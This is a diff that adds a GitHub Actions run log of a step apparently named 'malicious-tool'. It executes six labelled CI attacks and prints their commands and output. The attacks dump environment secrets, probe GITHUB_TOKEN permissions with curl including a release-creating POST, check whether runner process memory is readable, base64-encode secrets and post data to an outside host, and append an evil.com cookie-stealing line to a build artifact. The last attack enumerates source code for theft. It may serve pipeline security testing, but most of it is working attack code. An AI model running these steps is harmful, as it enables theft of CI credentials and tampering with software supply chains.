@@ -1,0 +1,161 @@
+﻿2026-04-02T19:11:21.1535782Z Prepare all required actions
+2026-04-02T19:11:21.1672330Z ##[group]Run ./.github/actions/malicious-tool
+2026-04-02T19:11:21.1672880Z ##[endgroup]
+2026-04-02T19:11:21.1781384Z ##[group]Run FILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"
+2026-04-02T19:11:21.1782858Z [36;1mFILES="$(find src -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | sort | tr '\n' ',')"[0m
+2026-04-02T19:11:21.1783833Z [36;1mecho "files=$FILES" >> "$GITHUB_OUTPUT"[0m
+2026-04-02T19:11:21.1784397Z [36;1mecho "Found source files: $FILES"[0m
+2026-04-02T19:11:21.1816820Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:21.1817457Z ##[endgroup]
+2026-04-02T19:11:21.1915934Z Found source files: src/app.js,
+2026-04-02T19:11:21.1967473Z ##[group]Run echo "========================================="
+2026-04-02T19:11:21.1968146Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:21.1969314Z [36;1mecho "ATTACK 1: Environment Variable Dump"[0m
+2026-04-02T19:11:21.1969911Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:21.1970472Z [36;1mprintenv | sort > env_dump.txt[0m
+2026-04-02T19:11:21.1970995Z [36;1mwhile IFS= read -r line; do[0m
+2026-04-02T19:11:21.1971471Z [36;1m  KEY="${line%%=*}"[0m
+2026-04-02T19:11:21.1971898Z [36;1m  case "$KEY" in[0m
+2026-04-02T19:11:21.1972427Z [36;1m    *SECRET*|*TOKEN*|*KEY*|*PASSWORD*|*CREDENTIAL*|*AWS*)[0m
+2026-04-02T19:11:21.1973036Z [36;1m      echo "FOUND SECRET: $line"[0m
+2026-04-02T19:11:21.1973519Z [36;1m      ;;[0m
+2026-04-02T19:11:21.1973888Z [36;1m    GITHUB_TOKEN)[0m
+2026-04-02T19:11:21.1974376Z [36;1m      echo "FOUND GITHUB_TOKEN: ${line:0:30}..."[0m
+2026-04-02T19:11:21.1974901Z [36;1m      ;;[0m
+2026-04-02T19:11:21.1975257Z [36;1m  esac[0m
+2026-04-02T19:11:21.1975633Z [36;1mdone < env_dump.txt[0m
+2026-04-02T19:11:21.1976386Z [36;1mSECRET_COUNT="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|CREDENTIAL|AWS' | wc -l || true)"[0m
+2026-04-02T19:11:21.1977385Z [36;1mecho "Total secrets found in environment: $SECRET_COUNT"[0m
+2026-04-02T19:11:21.2003862Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:21.2004453Z ##[endgroup]
+2026-04-02T19:11:21.2052514Z =========================================
+2026-04-02T19:11:21.2053347Z ATTACK 1: Environment Variable Dump
+2026-04-02T19:11:21.2212829Z =========================================
+2026-04-02T19:11:21.2213690Z Total secrets found in environment: 0
+2026-04-02T19:11:21.2249037Z ##[group]Run echo "========================================="
+2026-04-02T19:11:21.2249729Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:21.2250374Z [36;1mecho "ATTACK 2: GITHUB_TOKEN Permission Check"[0m
+2026-04-02T19:11:21.2250989Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:21.2251541Z [36;1mif [ -n "$GITHUB_TOKEN" ]; then[0m
+2026-04-02T19:11:21.2252841Z [36;1m  REPO_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:11:21.2254968Z [36;1m  BRANCH_STATUS="$(curl -s -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/branches" -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:11:21.2257473Z [36;1m  RELEASE_STATUS="$(curl -s -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/releases" -d '{"tag_name":"test-probe","draft":true}' -o /dev/null -w "%{http_code}")"[0m
+2026-04-02T19:11:21.2259433Z [36;1m  echo "Token exists: YES"[0m
+2026-04-02T19:11:21.2259969Z [36;1m  echo "Repo access status: $REPO_STATUS"[0m
+2026-04-02T19:11:21.2260545Z [36;1m  echo "Can read branches: $BRANCH_STATUS"[0m
+2026-04-02T19:11:21.2261134Z [36;1m  echo "Can create releases: $RELEASE_STATUS"[0m
+2026-04-02T19:11:21.2261882Z [36;1melse[0m
+2026-04-02T19:11:21.2262313Z [36;1m  echo "No GITHUB_TOKEN found in environment"[0m
+2026-04-02T19:11:21.2262834Z [36;1mfi[0m
+2026-04-02T19:11:21.2289293Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:21.2289881Z env:
+2026-04-02T19:11:21.2290465Z   GITHUB_TOKEN: ***
+2026-04-02T19:11:21.2290845Z ##[endgroup]
+2026-04-02T19:11:21.2337926Z =========================================
+2026-04-02T19:11:21.2338932Z ATTACK 2: GITHUB_TOKEN Permission Check
+2026-04-02T19:11:21.2339448Z =========================================
+2026-04-02T19:11:22.1834330Z Token exists: YES
+2026-04-02T19:11:22.1835103Z Repo access status: 200
+2026-04-02T19:11:22.1835738Z Can read branches: 200
+2026-04-02T19:11:22.1836189Z Can create releases: 403
+2026-04-02T19:11:22.1878900Z ##[group]Run echo "========================================="
+2026-04-02T19:11:22.1879618Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.1880484Z [36;1mecho "ATTACK 3: Process Memory Scan"[0m
+2026-04-02T19:11:22.1881028Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.1881688Z [36;1mRUNNER_PID="$(pgrep -f 'Runner.Worker' || echo 'none')"[0m
+2026-04-02T19:11:22.1882333Z [36;1mecho "Runner.Worker PID: $RUNNER_PID"[0m
+2026-04-02T19:11:22.1882987Z [36;1mif [ "$RUNNER_PID" != "none" ] && [ -r "/proc/$RUNNER_PID/maps" ]; then[0m
+2026-04-02T19:11:22.1883707Z [36;1m  echo "Can read /proc/$RUNNER_PID/maps: YES"[0m
+2026-04-02T19:11:22.1884433Z [36;1m  READABLE_REGIONS="$(grep ' r' "/proc/$RUNNER_PID/maps" | wc -l || true)"[0m
+2026-04-02T19:11:22.1885218Z [36;1m  echo "Readable memory regions: $READABLE_REGIONS"[0m
+2026-04-02T19:11:22.1885869Z [36;1m  echo "Memory dump capability: CONFIRMED"[0m
+2026-04-02T19:11:22.1886377Z [36;1melse[0m
+2026-04-02T19:11:22.1886791Z [36;1m  echo "Memory dump capability: BLOCKED"[0m
+2026-04-02T19:11:22.1887279Z [36;1mfi[0m
+2026-04-02T19:11:22.1930362Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:22.1931009Z ##[endgroup]
+2026-04-02T19:11:22.1992081Z =========================================
+2026-04-02T19:11:22.1992653Z ATTACK 3: Process Memory Scan
+2026-04-02T19:11:22.1993151Z =========================================
+2026-04-02T19:11:22.2123742Z Runner.Worker PID: 2153
+2026-04-02T19:11:22.2124567Z Can read /proc/2153/maps: YES
+2026-04-02T19:11:22.2156843Z Readable memory regions: 810
+2026-04-02T19:11:22.2157396Z Memory dump capability: CONFIRMED
+2026-04-02T19:11:22.2182812Z ##[group]Run echo "========================================="
+2026-04-02T19:11:22.2183248Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.2183621Z [36;1mecho "ATTACK 4: Exfiltration Attempt"[0m
+2026-04-02T19:11:22.2183978Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.2184453Z [36;1mPAYLOAD="$(printenv | grep -iE 'SECRET|TOKEN|KEY|PASSWORD|AWS' | base64 -w 0 || true)"[0m
+2026-04-02T19:11:22.2184930Z [36;1mif [ -n "$PAYLOAD" ]; then[0m
+2026-04-02T19:11:22.2185273Z [36;1m  echo "Encoded payload ready (${#PAYLOAD} bytes)"[0m
+2026-04-02T19:11:22.2185626Z [36;1m  echo "Base64 payload:"[0m
+2026-04-02T19:11:22.2185908Z [36;1m  echo "$PAYLOAD"[0m
+2026-04-02T19:11:22.2186159Z [36;1melse[0m
+2026-04-02T19:11:22.2186408Z [36;1m  echo "No secrets found to exfiltrate"[0m
+2026-04-02T19:11:22.2186704Z [36;1mfi[0m
+2026-04-02T19:11:22.2187470Z [36;1mEXFIL_TEST="$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 https://httpbin.org/post -d "data=test_exfil" 2>/dev/null || echo "blocked")"[0m
+2026-04-02T19:11:22.2188165Z [36;1mecho "Outbound HTTP to external server: $EXFIL_TEST"[0m
+2026-04-02T19:11:22.2215222Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:22.2215599Z ##[endgroup]
+2026-04-02T19:11:22.2333713Z =========================================
+2026-04-02T19:11:22.2334269Z ATTACK 4: Exfiltration Attempt
+2026-04-02T19:11:22.2334682Z =========================================
+2026-04-02T19:11:22.2335483Z No secrets found to exfiltrate
+2026-04-02T19:11:22.7585144Z Outbound HTTP to external server: 200
+2026-04-02T19:11:22.7614801Z ##[group]Run echo "========================================="
+2026-04-02T19:11:22.7615235Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.7615589Z [36;1mecho "ATTACK 5: Artifact Poisoning"[0m
+2026-04-02T19:11:22.7615914Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.7616235Z [36;1mmkdir -p build[0m
+2026-04-02T19:11:22.7616506Z [36;1mif [ ! -f "build/app.js" ]; then[0m
+2026-04-02T19:11:22.7616863Z [36;1m  echo "console.log('legitimate app');" > build/app.js[0m
+2026-04-02T19:11:22.7617219Z [36;1mfi[0m
+2026-04-02T19:11:22.7617442Z [36;1m{[0m
+2026-04-02T19:11:22.7617658Z [36;1m  echo ""[0m
+2026-04-02T19:11:22.7618035Z [36;1m  echo "// BACKDOOR: fetch('https://evil.com/steal?' + document.cookie)"[0m
+2026-04-02T19:11:22.7618635Z [36;1m} >> build/app.js[0m
+2026-04-02T19:11:22.7619180Z [36;1mecho "Artifact poisoned successfully"[0m
+2026-04-02T19:11:22.7648856Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:22.7649274Z ##[endgroup]
+2026-04-02T19:11:22.7699418Z =========================================
+2026-04-02T19:11:22.7699938Z ATTACK 5: Artifact Poisoning
+2026-04-02T19:11:22.7700346Z =========================================
+2026-04-02T19:11:22.7714425Z Artifact poisoned successfully
+2026-04-02T19:11:22.7738613Z ##[group]Run echo "========================================="
+2026-04-02T19:11:22.7739030Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.7739387Z [36;1mecho "ATTACK 6: Source Code Theft Attempt"[0m
+2026-04-02T19:11:22.7739725Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.7740287Z [36;1mFILE_COUNT="$(find . -type f \( -name '*.js' -o -name '*.ts' -o -name '*.py' -o -name '*.java' -o -name '*.go' \) | wc -l || true)"[0m
+2026-04-02T19:11:22.7740924Z [36;1mTOTAL_SIZE="$(du -sh . 2>/dev/null | cut -f1 || echo 'unknown')"[0m
+2026-04-02T19:11:22.7741343Z [36;1mecho "Source files found: $FILE_COUNT"[0m
+2026-04-02T19:11:22.7741683Z [36;1mecho "Total workspace size: $TOTAL_SIZE"[0m
+2026-04-02T19:11:22.7742020Z [36;1mecho "Could compress and exfiltrate: YES"[0m
+2026-04-02T19:11:22.7768861Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:22.7769246Z ##[endgroup]
+2026-04-02T19:11:22.7815779Z =========================================
+2026-04-02T19:11:22.7816345Z ATTACK 6: Source Code Theft Attempt
+2026-04-02T19:11:22.7816809Z =========================================
+2026-04-02T19:11:22.7876711Z Source files found: 2
+2026-04-02T19:11:22.7877187Z Total workspace size: 620K
+2026-04-02T19:11:22.7877634Z Could compress and exfiltrate: YES
+2026-04-02T19:11:22.7902219Z ##[group]Run echo "========================================="
+2026-04-02T19:11:22.7902639Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.7902966Z [36;1mecho "ATTACK SUMMARY"[0m
+2026-04-02T19:11:22.7903279Z [36;1mecho "========================================="[0m
+2026-04-02T19:11:22.7903608Z [36;1mecho "1. Environment variable dump"[0m
+2026-04-02T19:11:22.7903946Z [36;1mecho "2. GITHUB_TOKEN permission probe"[0m
+2026-04-02T19:11:22.7904284Z [36;1mecho "3. Process memory access check"[0m
+2026-04-02T19:11:22.7904617Z [36;1mecho "4. Exfiltration via encoded logs + HTTP"[0m
+2026-04-02T19:11:22.7904965Z [36;1mecho "5. Build artifact poisoning"[0m
+2026-04-02T19:11:22.7905266Z [36;1mecho "6. Source code enumeration"[0m
+2026-04-02T19:11:22.7932168Z shell: /usr/bin/bash --noprofile --norc -e -o pipefail {0}
+2026-04-02T19:11:22.7932544Z ##[endgroup]
+2026-04-02T19:11:22.7979518Z =========================================
+2026-04-02T19:11:22.7980052Z ATTACK SUMMARY
+2026-04-02T19:11:22.7980427Z =========================================
+2026-04-02T19:11:22.7980910Z 1. Environment variable dump
+2026-04-02T19:11:22.7981357Z 2. GITHUB_TOKEN permission probe
+2026-04-02T19:11:22.7982037Z 3. Process memory access check
+2026-04-02T19:11:22.7982477Z 4. Exfiltration via encoded logs + HTTP
+2026-04-02T19:11:22.7982945Z 5. Build artifact poisoning
+2026-04-02T19:11:22.7983213Z 6. Source code enumeration
